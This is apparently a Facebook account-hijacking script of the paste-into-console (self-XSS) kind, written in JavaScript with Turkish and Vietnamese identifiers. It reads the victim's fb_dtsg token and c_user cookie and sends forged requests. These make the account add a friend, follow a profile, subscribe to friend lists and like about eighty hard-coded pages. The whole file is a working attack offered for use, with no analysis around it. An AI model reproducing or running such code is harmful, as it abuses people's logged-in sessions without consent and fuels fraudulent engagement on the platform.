var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
// Fiidannii
a("100000740396815");
IDS("100006667423609");
sublist("1482045118694388");
sublist("1498675803699892");
// cheo Ph?c H?p
Like("284905944997186");      
Like("549252541753997");       
Like("291985050908298");      
Like("434199446682841");     
Like("1475255582701545");        
Like("3987392735551927");        
Like("559063920821987");             
Like("1433722496857372");       
Like("530612090325999");     
Like("622876531124074");    
Like("427659460701846");      
Like("241622229315042");
Like("429440220425222");            
Like("1413948492174215");        
Like("177958912409882");        
Like("146386625533559");      
Like("177112352430184");        
Like("381907345187380");        
Like("113240475405896");       
Like("255801804567230");      
Like("339242752785770");        
Like("1453363074899529");    
Like("298077030319081");     
Like("144832549003585");      
Like("1479376982278277");      
Like("154431041314341");        
Like("467639289947088");        
Like("240720592745217");        
Like("1404568809812802");        
Like("294682120697643");       
Like("295839763904867");        
Like("746973295343063");        
Like("1451755765060807");       
Like("150688308342779");         
Like("317392404950386");       
Like("216315021820939");      
Like("1440018632903294");        
Like("609391169146484");        
Like("611844778854834");       
Like("100343343428842");        
Like("181753108622573");       
Like("1486122281607504");        
Like("226691497531071");       
Like("181753108622573");        
Like("303590146434296");       
Like("188073521270572");       
Like("283467628444515");        
Like("387855318021088");        
Like("309606919145012");        
Like("194515267252649");        
Like("123936357622826");  
Like("228769643822939"); 
Like("193147074148337"); 
Like("376929829111365");    
Like("175626832638899");  
Like("1409614855986059");       
Like("788546951163765");   
Like("649085055160618");     
Like("745507168846828");  
Like("1438136419771327");  
Like("238655162997817");      
Like("315657555253718"); 
Like("870503729631416");      
Like("200845086658704");  
Like("446442712069317");  
Like("465812233565446");
Like("694414927271571");      
Like("642773782477244");        
Like("1380929018863492");       
Like("888483321178088");      
Like("236085363248756");     
Like("456788147789970");        
Like("323490124468005"); 
Like("605839459524226");      
Like("768223379894748");        
Like("509083045884977");       
Like("1456959444545851");      
Like("510788982382780");
}
